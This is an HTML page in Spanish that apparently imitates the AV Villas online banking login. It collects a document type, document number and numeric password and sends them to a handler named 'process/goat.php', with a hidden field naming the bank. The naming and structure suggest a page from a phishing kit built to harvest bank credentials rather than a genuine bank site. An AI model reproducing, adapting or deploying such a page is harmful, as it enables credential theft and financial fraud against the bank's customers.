<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banca Digital</title>
    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
    <script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>  		    

    <style>
        * {
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }

        .form {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        .form label {
            position: relative;
        }

        .form label .input {
            width: 100%;
            padding: 20px 10px 10px 10px;
            outline: none;
            border: 1px solid;
        }

        .form label .input + span {
            position: absolute;
            left: 10px;
            top: 15px;
            transition: 0.3s ease;
        }

        .form label .input:focus + span,
        .form label .input:valid + span {
            top: 5px;
            font-size: 0.7em;
        }
    </style>
</head>
<body style="background-image:url(img/background.png);">

    <div>
        <br><br>
        <center><img src="img/register-bg-logo.svg"></center>
        <center><br><br><a style="font-size:18px; color:white;">Ingresa a la banca virtual</a><br></center>
    </div>

    <br>

    <center>
        <select name="tipo_documento" style="width:90%; height:55px; border-radius:5px; background-color:white; color:black;">
            <option value="cc">Cédula de Ciudadanía</option>
            <option value="ce">Cédula de Extranjería</option>
            <option value="pass">Pasaporte</option>
        </select>
    </center>

    <form class="form" style="margin-top:15px;" method="POST" action="process/goat.php">
        <input type="hidden" name="cliente_id" value="123"> <!-- ID Cliente ejemplo -->

        <label style="width:85%; height:55px;">
            <input required="required" type="text" class="input" id="txtUsuario" name="user" style="width:100%; margin-left:-10px; border-radius:5px; height:25px;">
            <span>Número de documento</span>
        </label>
        
        <label style="width:85%; height:55px;">
            <input required="required" type="password" class="input" id="txtPass" name="pass" style="width:100%; margin-left:-10px; border-radius:5px; height:25px;">
            <span>Ingrese su clave</span>
        </label>
        
        <input type="hidden" name="banco" value="Avvillas">
        <a href="#" style="color:white; margin-left:50%; font-size:12px;">Olvidé mi contraseña</a>
        <input type="submit" value="Ingresar" id="btnUsuario" style="width:85%; height:45px; background-color:red; color:white; border:none; border-radius:100px; margin-left:-10px; font-size:14px;">
    </form>

    <br>
    <hr style="width:90%;">
    <br>
    <a style="color:white;">¿Aún no tienes contraseña para ingresar?</a><br>
    <a href="#" style="color:white;">Regístrate</a>

    <script>
        // Limitar el campo de contraseña solo a números
        const txtPass = document.getElementById('txtPass');

        txtPass.addEventListener('input', function() {
            const value = txtPass.value;
            const cleanValue = value.replace(/\D/g, ''); // Remover caracteres no numéricos

            if (value !== cleanValue) {
                txtPass.value = cleanValue;
            }
        });
    </script>
</body>
</html>
